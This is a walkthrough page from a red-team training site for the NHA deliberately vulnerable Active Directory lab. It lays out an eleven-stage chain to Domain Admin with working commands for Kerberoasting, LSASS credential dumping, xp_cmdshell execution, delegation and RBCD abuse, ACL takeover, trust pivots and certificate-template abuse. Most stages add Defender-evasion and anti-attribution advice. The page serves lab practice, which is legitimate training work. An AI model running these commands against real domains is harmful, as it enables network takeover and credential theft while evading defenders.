---
layout: training-page
title: "Ninja Hacker Academy (NHA) — Red Team Academy"
module: "Active Directory"
tags:
  - nha
  - goad
  - lab
  - practice
  - active-directory
page_key: "ad-nha"
render_with_liquid: false
---

# Ninja Hacker Academy (NHA)

## About NHA

NHA (Ninja Hacker Academy) is an advanced deliberately-vulnerable Active Directory lab from Orange Cyberdefense — the same team behind GOAD. Where GOAD is a breadth-first introduction to AD attacks, NHA goes deeper: **Windows Defender is enabled on every machine**, passwords aren't in rockyou, and the attack chain is tightly interconnected with no easy shortcuts. The theme is Naruto-inspired; the misconfigurations are real.

**Goal:** Achieve Domain Admin on both `academy.ninja.lan` and `ninja.hack`.

**Starting point:** `srv01` (web.academy.ninja.lan) at `192.168.58.21` — no creds provided.

> NHA documentation explicitly discourages looking at recipe files for passwords. This page documents the vulnerability types and attack sequence — not the flags or plaintext credentials.

**See also — [NHA Branching Attack Path](/active-directory/nha-attack-path/)** for a decision-graph view of every route to Domain Admin, with multiple options at each junction.

## Lab Architecture

```
# NHA Network Layout (192.168.58.0/24):
#
# Domain 1: ACADEMY.NINJA.LAN  (netbios: ACADEMY)
# ├── DC02  dc-ac.academy.ninja.lan       192.168.58.20  (WS2019, DC)
# ├── SRV01 web.academy.ninja.lan          192.168.58.21  (WS2019, IIS web server)  ← starting point
# ├── SRV02 sql.academy.ninja.lan          192.168.58.22  (WS2019, MSSQL)
# └── SRV03 share.academy.ninja.lan        192.168.58.23  (WS2019, file share, gMSA)
#
# Domain 2: NINJA.HACK  (netbios: NINJA)
# └── DC01  dc-vil.ninja.hack              192.168.58.10  (WS2019, DC + ADCS)
#
# Trust: ACADEMY.NINJA.LAN ←bidirectional→ NINJA.HACK
#
# Security posture: Windows Defender enabled on ALL machines, updates applied.
```

## Intentional Vulnerabilities

| Machine | Hostname | Vulnerability / Misconfiguration | Technique |
|---------|----------|----------------------------------|-----------|
| DC01 | dc-vil | ADCS — custom `SignatureValidation` template | [ADCS Attacks](/active-directory/adcs-attacks/) |
| DC01 | dc-vil | ACL: Jonin group has `GenericAll` on `SignatureValidation` cert template | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `Hokage` group has `GenericAll` on Domain Admins + AdminSDHolder | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `Sanin` group has `GenericAll` on `Jonin` group | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `olivia.davis` has `WriteDacl` on `rachel.philips` | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | ACL: `SQL$` computer has `GenericAll` on `CN=Computers` OU | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | ACL: `backup` user has `WriteOwner` on `Sensei` group + AdminSDHolder | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | gMSA: `gmsaNFS$` has `ForceChangePassword` on `backup` user | [ACL Abuse](/active-directory/acl-abuse/) |
| SRV01 | web | IIS web application — web vulnerability for initial foothold | [Web Hacking Methodology](/web/web-hacking-methodology/) |
| SRV01 | web | CredSSP server enabled — accepts incoming CredSSP auth | [Kerberos Delegation](/active-directory/kerberos-delegation/) |
| SRV02 | sql | MSSQL with `xp_cmdshell` potential; `frank` is sysadmin | [Database Attacks](/exploitation/database-attacks/) |
| SRV02 | sql | Firewall disabled — direct access to all ports | — |
| SRV03 | share | Scheduled task: bot.ps1 connects to web via CredSSP as `frank` every 60s | Credential Capture |
| SRV03 | share | CredSSP client enabled — initiates CredSSP sessions to web | [Kerberos Delegation](/active-directory/kerberos-delegation/) |
| Any | — | `frank` has SPN `HTTP/WEB.academy.ninja.lan` — Kerberoastable | [Kerberoasting](/active-directory/kerberoasting/) |
| Any | — | `sql_svc` has SPN `MSSQLSvc/sql.academy.ninja.lan:1433` — Kerberoastable | [Kerberoasting](/active-directory/kerberoasting/) |
| Any | — | `frank` has constrained delegation (protocol transition) to `eventlog/share` | [Kerberos Delegation](/active-directory/kerberos-delegation/) |

## Users & Groups

### academy.ninja.lan (ACADEMY)

| Account | Type | Groups | Role / Notes |
|---------|------|--------|--------------|
| alice | User | Sensei, Domain Admins | Domain Admin |
| david | User | Sensei, Team7 | Team 7 sensei |
| frank | User | Teacher | SPN set (Kerberoastable); MSSQL sysadmin; constrained delegation |
| olivia | User | Teacher | Cross-domain counterpart to olivia.davis in ninja.hack |
| backup | User | — | Has WriteOwner on Sensei + AdminSDHolder |
| sql_svc | User | — | Service account; SPN set (Kerberoastable) |
| gmsaNFS$ | gMSA | — | Has ForceChangePassword on backup; authorized on `share` only |
| SQL$ | Computer | — | Has GenericAll on Computers OU |
| Sensei | Group | — | Local admins on web + sql; DA-equivalent |
| Teacher | Group | — | Local admins on web + sql |
| Genin | Group | — | Student accounts (Team 7–10) |

### ninja.hack (NINJA)

| Account | Type | Groups | Role / Notes |
|---------|------|--------|--------------|
| alice.johnson | User | Hokage, Domain Admins | Domain Admin |
| frank.umino | User | Academy_Teacher | Cross-domain counterpart |
| olivia.davis | User | Academy_Teacher | Has WriteDacl on rachel.philips |
| rachel.philips | User | Sanin | WriteDacl target; Sanin has GenericAll on Jonin |
| david.wilson | User | Jonin | Jonin has GenericAll on SignatureValidation template |
| Jonin | Group | — | GenericAll on `SignatureValidation` ADCS template |
| Sanin | Group | — | GenericAll on Jonin group |
| Hokage | Group | — | GenericAll on Domain Admins + AdminSDHolder |
| Academy_Teacher | Group | — | Cross-domain group |

## Flags

| Machine | Hostname | Flag Location |
|---------|----------|---------------|
| SRV01 | web | `C:\Users\Administrator\Desktop\flag.txt` |
| SRV02 | sql | `C:\flag.txt` (low priv) · `C:\Users\Administrator\Desktop\flag.txt` (admin) |
| SRV03 | share | `C:\Users\Administrator\Desktop\flag.txt` |
| DC02 | dc-ac | `C:\Users\Administrator\Desktop\flag.txt` (Domain Admin — ACADEMY) |
| DC01 | dc-vil | `C:\Users\Administrator\Desktop\flag.txt` (Domain Admin — NINJA) |

## Attack Chain

### Stage 1 — Web Foothold (SRV01)

The entry point is the IIS web application at `http://192.168.58.21`. Enumerate the web app for vulnerabilities — file upload, SQLi, SSRF, SSTI, command injection, insecure deserialization, or authentication bypass. Get RCE and establish a C2 implant. Defender is live, so an evasive payload is required.

**Multiple paths to foothold — try each class:**

| Class | Look for | Page |
|-------|----------|------|
| File upload | Unrestricted extensions, `.aspx;.jpg` bypasses | [File Upload](/web/file-upload/) |
| Command injection | URL/form params used in shell calls | [Command Injection](/web/command-injection/) |
| SQL injection | Login forms, search fields, cookies | [SQL Injection](/web/sql-injection/) |
| SSTI | User-rendered templates (Razor, Jinja, etc.) | [SSTI](/web/ssti/) |
| Deserialization | ViewState, base64 cookies, ObjectInputStream | [Insecure Deserialization](/web/insecure-deserialization/) |
| SSRF + metadata | URL fetch endpoints proxying user input | [SSRF](/web/ssrf/) |
| IIS-specific | Short-name enum, `web.config` disclosure | [IIS Shortname](/web/iis-shortscan/) |

```
# Enumerate the web application:
curl http://192.168.58.21/
gobuster dir -u http://192.168.58.21 -w /usr/share/wordlists/dirb/common.txt -x php,aspx,html
feroxbuster -u http://192.168.58.21 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

# IIS short-name scan (surfaces hidden files):
java -jar IIS-ShortName-Scanner.jar 2 20 http://192.168.58.21/

# Nuclei for known CVE detection:
nuclei -u http://192.168.58.21 -tags iis,aspnet,cve

# Once you have RCE — use an evasive loader (see Evasion section):
# Sliver, Havoc, or Cobalt Strike with custom shellcode loader
```

**Defender-specific evasion for Stage 1:**

- Do NOT drop `shell.aspx` with cmd.exe invocations — Defender AMSI flags `cmd /c whoami`
- Use an encrypted loader that runs shellcode in-process (see [Shellcode Loaders](/evasion/shellcode-loaders/))
- Wrap PowerShell stages in [AMSI Bypass](/evasion/amsi-bypass/) before running any .NET tooling
- Consider [HTML Smuggling](/evasion/html-smuggling/) if you also need client-side delivery

After foothold on web, the bot from `share` connects every 60 seconds — see Stage 4 for CredSSP capture.

**Relevant pages:** [Web Hacking Methodology](/web/web-hacking-methodology/) · [Web Pentest Checklist](/web/web-pentest-checklist/) · [Windows Defender Evasion](/evasion/windows-defender/) · [Shellcode Loaders](/evasion/shellcode-loaders/) · [AMSI Bypass](/evasion/amsi-bypass/) · [Privilege Escalation Windows](/post-exploitation/privesc-windows/)

---

### Stage 2 — Domain Enumeration

```
# From web (SRV01) — BloodHound collection against ACADEMY:
bloodhound-python \
  -d 'academy.ninja.lan' \
  -u 'YOURACCOUNT' \
  -p 'PASSWORD' \
  -ns 192.168.58.20 \
  -c All \
  --zip

# Quick LDAP enum with NetExec:
netexec ldap 192.168.58.20 -u 'user' -p 'pass' -d 'academy.ninja.lan' \
  --kerberoasting kerb.txt --asreproast asrep.txt --users

# BloodHound queries to run:
# - Shortest path to Domain Admins
# - Find principals with DCSync rights
# - Find users with SPNs
# - Find computers where Domain Users are local admins
```

**Defender-specific evasion for Stage 2:**

- Run BloodHound collection from Linux (`bloodhound-python`) — avoids dropping SharpHound.exe on the web server
- If you must collect from Windows, use [SharpHound's reflective loader](/active-directory/bloodhound/) after an [AMSI Bypass](/evasion/amsi-bypass/)
- `netexec` from your Kali attacker box — all LDAP / SMB traffic sources from Linux, zero Defender exposure

**Also worth checking early:**

- **AS-REP roastable accounts** — any account with "Do not require Kerberos preauth" set leaks hashes without creds, see [AS-REP Roasting](/active-directory/asreproasting/)
- **Null session SMB enumeration** of user lists — lesser-seen on WS2019 but worth trying
- **LDAP anonymous bind** — sometimes exposes service info before any auth

**Relevant pages:** [AD Enumeration](/active-directory/ad-enumeration/) · [BloodHound](/active-directory/bloodhound/) · [AS-REP Roasting](/active-directory/asreproasting/) · [AD LOTL](/active-directory/ad-lotl/)

---

### Stage 3 — Kerberoasting (frank, sql_svc)

Two Kerberoastable accounts in ACADEMY:

- `frank` — SPN: `HTTP/WEB.academy.ninja.lan` — Teacher account, MSSQL sysadmin
- `sql_svc` — SPN: `MSSQLSvc/sql.academy.ninja.lan:1433` — SQL service account

```
# Request TGS hashes:
GetUserSPNs.py 'academy.ninja.lan/anyuser:pass' \
  -dc-ip 192.168.58.20 -request

# Crack (passwords are NOT in rockyou — check custom wordlists, rules, or patterns):
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Note: NHA passwords use patterns like "Il0ve!something" or "Sh@r1ng..." 
# Use rules-based cracking rather than straight wordlist attacks.
```

**Defender-specific evasion for Stage 3:**

- Run `GetUserSPNs.py` (Impacket) from Linux — avoids dropping Rubeus.exe on any Windows host
- If you must run Rubeus: reflective-load it after an [AMSI Bypass](/evasion/amsi-bypass/), and prefer AES-key requests over RC4 to reduce downgrade-detection telemetry
- Crack offline on your attacker machine — never on a host in the lab

**Post-crack — also consider:**

- **Silver tickets** with the cracked hash: forge TGS for `MSSQLSvc/sql` and `HTTP/web` directly, skipping future KDC 4769 events
- **AS-REP roast** the same users as a hash-collection fallback if Kerberoasting cracks fail

**Relevant pages:** [Kerberoasting & AS-REP](/active-directory/kerberoasting/) · [AS-REP Roasting](/active-directory/asreproasting/) · [DCSync & Golden Ticket](/active-directory/dcsync/) (silver ticket forgery)

---

### Stage 4 — CredSSP Credential Capture (frank's creds)

srv03 runs a scheduled PowerShell bot (`bot.ps1`) every minute. The bot opens a CredSSP session to `web.academy.ninja.lan` authenticating as `academy\frank`. CredSSP delegates full cleartext credentials to the server — if you control `web`, you receive frank's cleartext password.

**Full technique details on the dedicated [CredSSP Attacks](/active-directory/credssp-attacks/) page** — four capture methods including LSASS extraction, rogue listener, bot.ps1 poisoning for persistence, and TGT harvesting.

```
# After owning web (SRV01), monitor for incoming CredSSP sessions:

# Technique 1 — LSASS extraction (most common):
# Do NOT run mimikatz.exe on disk. Use a reflective loader.
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
# Wait up to 60 seconds for the bot to connect — frank's cleartext creds appear in tspkg/kerberos output.

# Technique 2 — Targeted LSASS dump with nanodump (EDR-lighter than procdump):
nanodump.x64.exe --write C:\Windows\Temp\lsass.bin --valid
# Exfil and parse offline with pypykatz.

# Technique 3 — Harvest Kerberos tickets instead of cleartext:
Invoke-Mimikatz -Command "sekurlsa::tickets /export"
# Use the TGT directly, no cracking needed.

# Technique 4 (persistence) — if you reach share, poison bot.ps1 itself.
# See the CredSSP page for the payload template.
```

**Defender-specific evasion for Stage 4:**

- `mimikatz.exe` on disk is instantly flagged — always use [reflective loaders](/evasion/shellcode-loaders/)
- Patch [AMSI](/evasion/amsi-bypass/) and [ETW](/evasion/etw-bypass/) before any PowerShell-based credential tooling
- Consider [DLL Unhooking](/evasion/dll-unhooking/) on NTDLL before calling `MiniDumpWriteDump`
- `nanodump` from Fortra is generally quieter than `procdump.exe` against modern Defender

**Relevant pages:** [CredSSP Attacks](/active-directory/credssp-attacks/) · [Kerberos Delegation](/active-directory/kerberos-delegation/) · [LSASS Dumping](/post-exploitation/lsass-dumping/) · [Lateral Movement](/post-exploitation/lateral-movement/) · [Shellcode Loaders](/evasion/shellcode-loaders/)

---

### Stage 5 — MSSQL Abuse → RCE on SQL (frank → SRV02)

`frank` is a MSSQL sysadmin on `sql.academy.ninja.lan`. Use frank's credentials to access MSSQL and execute OS commands.

```
# Connect to MSSQL as frank:
mssqlclient.py 'academy.ninja.lan/frank:PASSWORD@192.168.58.22' -windows-auth

# Enable and use xp_cmdshell:
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
# Returns: academy\frank (or SYSTEM if service runs as SYSTEM)

# Or use NetExec:
netexec mssql 192.168.58.22 -u 'frank' -p 'PASSWORD' -d 'academy.ninja.lan' -x 'whoami'
```

**Alternative paths to SRV02 (sql):**

1. **Kerberoast `sql_svc`** — the MSSQL service account's SPN is also Kerberoastable; cracking its hash gives you a silver-ticket forgery option without needing frank
2. **SQL$ RBCD** — the SQL computer account's GenericAll on the Computers OU lets you RBCD-abuse SRV02 itself — see Stage 9
3. **NTLM relay** — coerce SQL$ with PetitPotam / DFSCoerce and relay its auth to a target accepting NTLM — see [Coercion](/active-directory/coercion-attacks/) + [NTLM Relay](/active-directory/ntlm-relay/)

**Defender-specific evasion for Stage 5:**

- Run `mssqlclient.py` from Linux — zero Defender exposure
- If enabling `xp_cmdshell`, use PowerShell download-cradles encoded with [Codecepticon](/evasion/codecepticon/) rather than plain `powershell.exe iex`
- Consider [PowerShell Without PowerShell.exe](/evasion/powershell-without-ps/) (e.g., pwsh.dll in a trusted host) on sql to avoid script-block logging detection

**Relevant pages:** [Database Attacks](/exploitation/database-attacks/) · [Lateral Movement](/post-exploitation/lateral-movement/) · [Privilege Escalation Windows](/post-exploitation/privesc-windows/)

---

### Stage 6 — Constrained Delegation (frank → S4U2Self/Proxy)

`frank` has constrained delegation **with protocol transition** (`TrustedToAuthForDelegation = true`) configured to delegate to `eventlog/share.academy.ninja.lan`. Protocol transition means frank can impersonate ANY user (including Domain Admins) to the eventlog service on `share` — no TGT from the target user needed.

```
# From Kali — S4U2Self + S4U2Proxy with Impacket:
getST.py \
  -spn 'eventlog/share.academy.ninja.lan' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/frank:PASSWORD' \
  -dc-ip 192.168.58.20

# Use resulting ticket to access share as DA:
export KRB5CCNAME=Administrator@eventlog_share.academy.ninja.lan@ACADEMY.NINJA.LAN.ccache
wmiexec.py -k -no-pass Administrator@share.academy.ninja.lan

# Windows (Rubeus):
Rubeus.exe s4u /user:frank /password:PASSWORD /domain:academy.ninja.lan \
  /impersonateuser:Administrator \
  /msdsspn:"eventlog/share.academy.ninja.lan" \
  /ptt
```

**Alternative paths to SRV03 (share):**

1. **SQL$ RBCD** — configure RBCD on share pointing to a computer you control, then impersonate DA to share (Stage 9 technique applied to share)
2. **Compromise via Teacher / Sensei group creds** once you hold any local-admin-grade identity on web/sql
3. **Coerce share's machine account** with PetitPotam and relay it elsewhere — see [Coercion](/active-directory/coercion-attacks/) + [NTLM Relay](/active-directory/ntlm-relay/)

**Defender-specific evasion for Stage 6:**

- Use Impacket `getST.py` from Linux instead of Rubeus — no .NET on host
- If you must use Rubeus: reflective-load after [AMSI Bypass](/evasion/amsi-bypass/) and prefer AES256 (`/aes256:KEY`) over RC4 to avoid downgrade detections
- Protocol-transition activity generates 4769 events on the DC — pair with [AD LOTL](/active-directory/ad-lotl/) timing discipline

**Relevant pages:** [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/) · [CredSSP Attacks](/active-directory/credssp-attacks/) · [AD LOTL](/active-directory/ad-lotl/)

---

### Stage 7 — gMSA Abuse → backup account (SRV03 → DC02)

The gMSA `gmsaNFS$` is authorized on `share` (SRV03) and has `ForceChangePassword` on the `backup` user. Read the gMSA password from `share`, then use it to reset `backup`'s password.

```
# From share (SRV03) — read gMSA password:
# Windows PowerShell:
$gmsa = Get-ADServiceAccount -Identity gmsaNFS -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Or via Impacket from Linux (with DA or machine account on share):
bloodyAD -u 'SQL$' -p ':NTLM_HASH' -d 'academy.ninja.lan' \
  --host 192.168.58.20 get object gmsaNFS$ --attr msDS-ManagedPassword

# With gmsaNFS$ hash — force reset backup user's password:
net rpc password backup 'NewP@ss123!' \
  -U 'academy.ninja.lan/gmsaNFS$%:GMSA_NTLM' \
  -S 192.168.58.20

# Or with rpcclient:
rpcclient -U 'academy.ninja.lan/gmsaNFS$%' 192.168.58.20
rpcclient $> setuserinfo2 backup 23 'NewP@ss123!'
```

**Full technique details on the dedicated [gMSA Abuse](/active-directory/gmsa-abuse/) page** — five attack paths including DSInternals, bloodyAD from Linux, GMSAPasswordReader, direct PtH authentication as the gMSA, and post-DA DCSync of gMSA keys.

**Alternative to password reset on backup:**

- **Shadow Credentials** — instead of resetting backup's password (noisy, changes the password hash, can alert), write a `msDS-KeyCredentialLink` to backup and PKINIT-authenticate as backup without any password change. See [Shadow Credentials](/active-directory/shadow-credentials/).

**Defender-specific evasion for Stage 7:**

- Run `bloodyAD` or `gMSADumper.py` from Linux — DSInternals on Windows generates LSA-replication-style telemetry visible to defenders
- Tunnel the LDAP query through a compromised host via SOCKS/C2 so the source IP looks internal
- Prefer AES256 keys over derived passwords for subsequent authentication

**Relevant pages:** [gMSA Abuse](/active-directory/gmsa-abuse/) · [ACL / ACE Abuse](/active-directory/acl-abuse/) · [Shadow Credentials](/active-directory/shadow-credentials/) · [Pass-the-Hash](/active-directory/pass-the-hash/)

---

### Stage 8 — ACL Abuse: backup → Domain Admin (ACADEMY)

`backup` has `WriteOwner` on the `Sensei` group (which has local admin on web + sql and is effectively DA-adjacent) **and** on `AdminSDHolder`. Take ownership → grant yourself full control → add your account to Sensei.

`Sensei` members are also listed in `Domain Admins` via the alice account — escalating to Sensei membership gives Domain Admin.

```
# Take ownership of the Sensei group (from backup account):
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  set owner Sensei backup

# Grant backup GenericAll on Sensei:
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  add genericAll Sensei backup

# Add your account to Sensei:
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  add groupMember Sensei 'YOUR_USER'

# Or PowerView (Windows):
$cred = Get-Credential # backup credentials
Set-DomainObjectOwner -Identity Sensei -OwnerIdentity backup -Credential $cred
Add-DomainObjectAcl -TargetIdentity Sensei -PrincipalIdentity backup -Rights All -Credential $cred
Add-DomainGroupMember -Identity Sensei -Members 'youruser' -Credential $cred
```

**Alternative paths from backup → DA:**

1. **WriteOwner on AdminSDHolder** — backup also has WriteOwner on AdminSDHolder. Any change to AdminSDHolder's ACL propagates (via SDProp) to all protected groups (Domain Admins, Enterprise Admins, etc.) within ~60 minutes. Grant yourself DCSync rights at the domain root this way.
2. **Shadow Credentials on any Sensei member** — if backup's WriteOwner gives you GenericAll on Sensei, use that to add `msDS-KeyCredentialLink` on an existing Sensei member (e.g., `alice`) and PKINIT as them — preserves the original password
3. **Targeted Kerberoast via SPN set** — grant any Sensei member an SPN via GenericWrite, then Kerberoast them offline

**Defender-specific evasion for Stage 8:**

- Do all ACL edits from Linux with `bloodyAD` — stays off any Windows host
- Batch edits to reduce LDAP write event count; avoid back-to-back `dacledit` + `net rpc password` sequences that trigger correlation rules
- See [AD LOTL](/active-directory/ad-lotl/) for timing and source selection idioms

**Relevant pages:** [ACL / ACE Abuse](/active-directory/acl-abuse/) · [AD Persistence](/active-directory/ad-persistence/) · [Shadow Credentials](/active-directory/shadow-credentials/) · [DCSync & Golden Ticket](/active-directory/dcsync/)

---

### Stage 9 — SQL$ RBCD Abuse → lateral movement in ACADEMY

`SQL$` (the sql computer account) has `GenericAll` on `CN=Computers,DC=academy,DC=ninja,DC=lan`. This enables **Resource-Based Constrained Delegation (RBCD)** abuse: create a new computer account, configure RBCD on a target machine using SQL$'s GenericAll, then S4U2Self/Proxy to impersonate DA.

```
# Create attacker-controlled computer account:
addcomputer.py 'academy.ninja.lan/anyuser:pass' \
  -computer-name 'EVILPC$' \
  -computer-pass 'EvilPass123!' \
  -dc-ip 192.168.58.20

# Use SQL$ GenericAll on Computers to set msDS-AllowedToActOnBehalfOfOtherIdentity 
# on a target machine (e.g., share or dc02) pointing to EVILPC$:
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET$' \
  -action write 'academy.ninja.lan/SQL$:NTLM_HASH' \
  -hashes :NTLM -dc-ip 192.168.58.20

# S4U2Self/Proxy — get DA ticket for target:
getST.py \
  -spn 'cifs/TARGET.academy.ninja.lan' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/EVILPC$:EvilPass123!' \
  -dc-ip 192.168.58.20

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.academy.ninja.lan
```

**Alternative uses of SQL$'s GenericAll on Computers OU:**

1. **RBCD on DC02** — target the DC itself; impersonating Administrator to the DC effectively gives you DA
2. **RBCD on share** — a second path to SRV03 that doesn't go through frank's delegation
3. **RBCD on any future machine added to the OU** — useful for persistence (any new workstation is takeover-ready)
4. **Abuse to modify computer account attributes** — add SPNs, write keyCredentialLink (Shadow Credentials pattern on computers), or flip `TrustedToAuthForDelegation` for further chains

**Defender-specific evasion for Stage 9:**

- Run `addcomputer.py`, `rbcd.py`, and `getST.py` from Linux — zero on-host artifacts
- Your attacker-controlled computer account (`EVILPC$`) will appear in DC logs; pick a naming convention that blends in (`WKSTN-XX$` style rather than `EVILPC$`)
- Consider deleting the attacker computer account post-exploitation to reduce attribution

**Relevant pages:** [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/) · [ACL / ACE Abuse](/active-directory/acl-abuse/) · [Shadow Credentials](/active-directory/shadow-credentials/) · [Coercion Attacks](/active-directory/coercion-attacks/)

---

### Stage 10 — Cross-Domain Pivot to ninja.hack

`academy.ninja.lan` and `ninja.hack` share a **bidirectional trust**. After owning ACADEMY, use the inter-realm trust key to pivot into NINJA.

```
# From ACADEMY DA — dump trust keys:
secretsdump.py 'academy.ninja.lan/Administrator:pass@192.168.58.20'
# Look for: "ninja.hack\[TrustAccountName]" or inter-realm Kerberos keys

# Enumerate ninja.hack via trust:
bloodhound-python -d ninja.hack \
  -u 'Administrator@academy.ninja.lan' \
  -p 'PASSWORD' \
  -ns 192.168.58.10 \
  -c All

# Get cross-realm TGS for a service in ninja.hack:
getST.py \
  -spn 'cifs/dc-vil.ninja.hack' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/Administrator:pass' \
  -dc-ip 192.168.58.20
```

**Three ways to pivot across the trust:**

1. **Inter-realm TGT forge** — dump the inter-realm trust key with `secretsdump` from DA on ACADEMY, then forge an inter-realm TGT granting Administrator rights on the foreign domain
2. **Cross-realm TGS request** — with valid ACADEMY creds, request a service ticket for a SPN in ninja.hack directly; the trust key handles the cross-realm referral
3. **Direct credential use** — if a user in ACADEMY has the same name/password in NINJA (or a cross-domain account like `olivia.davis`), PtH/cred use directly across

**Defender-specific evasion for Stage 10:**

- Dump trust keys from Linux via `secretsdump.py -just-dc-user 'domain.local$'` — no Windows host touched
- When forging tickets, use `ticketer.py` from Linux, then `export KRB5CCNAME=`
- Prefer AES keys; RC4 trust tickets are a classic blue-team hunt

**Relevant pages:** [Domain Trusts](/active-directory/domain-trusts/) · [DCSync & Golden Ticket](/active-directory/dcsync/) · [Pass-the-Hash](/active-directory/pass-the-hash/)

---

### Stage 11 — ninja.hack ACL Chain → ADCS Abuse → Domain Admin

The attack path in `ninja.hack` uses a three-hop ACL chain terminating in ADCS template abuse (ESC4 → ESC1):

```
olivia.davis  →WriteDacl→  rachel.philips  (in Sanin)
Sanin group   →GenericAll→  Jonin group
Jonin group   →GenericAll→  SignatureValidation cert template
```

**Step 1 — olivia.davis WriteDacl on rachel.philips:**

```
# Add GenericAll ACE to rachel.philips via olivia.davis WriteDacl:
# (olivia.davis exists in both domains — use ninja.hack context after trust pivot)
dacledit.py -action write -rights FullControl \
  -principal 'olivia.davis' \
  -target 'rachel.philips' \
  'ninja.hack/olivia.davis:PASSWORD' \
  -dc-ip 192.168.58.10

# Now own rachel — reset her password or extract her hash:
net rpc password rachel.philips 'NewPass123!' \
  -U 'ninja.hack/olivia.davis%PASSWORD' -S 192.168.58.10
```

**Step 2 — Sanin → GenericAll → Jonin:**

```
# rachel.philips is in Sanin. Use Sanin's GenericAll on Jonin to add your account:
bloodyAD -u rachel.philips -p 'NewPass123!' -d ninja.hack --host 192.168.58.10 \
  add groupMember Jonin 'youruser'
```

**Step 3 — Jonin → GenericAll on SignatureValidation → ESC4 → ESC1:**

```
# Jonin has GenericAll on the SignatureValidation cert template.
# Modify template to make it ESC1-vulnerable (enrollee can supply SAN):
certipy template \
  -username 'youruser@ninja.hack' \
  -password 'pass' \
  -template 'SignatureValidation' \
  -save-old \
  -dc-ip 192.168.58.10
# Edit: set msPKI-Certificate-Name-Flag to ENROLLEE_SUPPLIES_SUBJECT

# Request cert as Domain Admin (ESC1):
certipy req \
  -username 'youruser@ninja.hack' \
  -password 'pass' \
  -ca 'ninja-DC-VIL-CA' \
  -template 'SignatureValidation' \
  -upn 'administrator@ninja.hack' \
  -dc-ip 192.168.58.10

# Authenticate with the cert (PKINIT):
certipy auth \
  -pfx administrator.pfx \
  -domain ninja.hack \
  -dc-ip 192.168.58.10
# → Gets NT hash for administrator@ninja.hack

# DCSync / shell:
secretsdump.py 'ninja.hack/administrator@192.168.58.10' -hashes :NT_HASH
```

**Alternative to password reset on rachel.philips:**

- **Shadow Credentials on rachel** — instead of `net rpc password`, write `msDS-KeyCredentialLink` to rachel and PKINIT as her. Password never changes — same downstream Sanin access, stealthier. See [Shadow Credentials](/active-directory/shadow-credentials/).

**Alternative to SignatureValidation template abuse:**

- If the template is additionally **ESC6-vulnerable** (EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA) or **ESC3-abusable** (enrollment agent chain), you may not even need to modify the template. Check all ESC classes with `certipy find -vulnerable -stdout` before writing
- **ESC8 via coerced relay** — coerce DC01's machine account (`dc-vil$`) with PetitPotam/DFSCoerce and relay its NTLM auth to the ADCS web enrollment endpoint. See [Coercion](/active-directory/coercion-attacks/) + [NTLM Relay](/active-directory/ntlm-relay/)

**Defender-specific evasion for Stage 11:**

- Run all certipy operations from Linux — Windows certificate enrollment tooling is heavily monitored
- `dacledit.py`, `bloodyAD` LDAP writes all from Linux
- Prefer AES256 keys in final PKINIT authentication

**Relevant pages:** [ACL / ACE Abuse](/active-directory/acl-abuse/) · [ADCS Attacks](/active-directory/adcs-attacks/) · [Shadow Credentials](/active-directory/shadow-credentials/) · [Coercion Attacks](/active-directory/coercion-attacks/) · [NTLM Relay](/active-directory/ntlm-relay/)

---

### Alternative Stage 11 — Hokage group → Direct DA on ninja.hack

If you can get a user into the `Hokage` group (e.g., by owning `alice.johnson` via trust pivot), `Hokage` has `GenericAll` on `Domain Admins` — trivially add any account.

```
# With Hokage group membership:
bloodyAD -u 'hokage_member' -p 'pass' -d ninja.hack --host 192.168.58.10 \
  add groupMember 'Domain Admins' 'youruser'
```

---

## Novel / Lesser-Used Techniques to Try

The canonical path above is well-worn. These variations show up less often in walkthroughs and may surprise automated detection rules:

1. **Poison `bot.ps1` on share for credential harvesting persistence** — see [CredSSP Attacks, Technique 3](/active-directory/credssp-attacks/). A backdoor inside an already-scheduled task is routinely missed in post-incident review.

2. **Shadow Credentials instead of password reset** — every place nha.md calls `net rpc password`, try `msDS-KeyCredentialLink` + PKINIT instead. Zero password change = invisible to password-reset alerts. See [Shadow Credentials](/active-directory/shadow-credentials/).

3. **Coerce + relay for cross-machine pivots** — PetitPotam/DFSCoerce against DC02 or DC01 machine accounts, relay to LDAPS for RBCD, or to ADCS web enrollment for ESC8. Useful when creds are scarce. See [Coercion Attacks](/active-directory/coercion-attacks/) + [NTLM Relay](/active-directory/ntlm-relay/).

4. **Silver tickets from Kerberoasted service hashes** — skip live authentication entirely; forge TGS for `MSSQLSvc/sql` and `HTTP/web` directly after cracking sql_svc or frank. No KDC 4769 events. See [DCSync & Golden Ticket](/active-directory/dcsync/).

5. **WriteOwner on AdminSDHolder for wildcard DA ACL** — backup's WriteOwner hits `AdminSDHolder` too. Change AdminSDHolder's ACL → SDProp propagates to every protected group within the hour → permanent DCSync rights. See [AD Persistence](/active-directory/ad-persistence/).

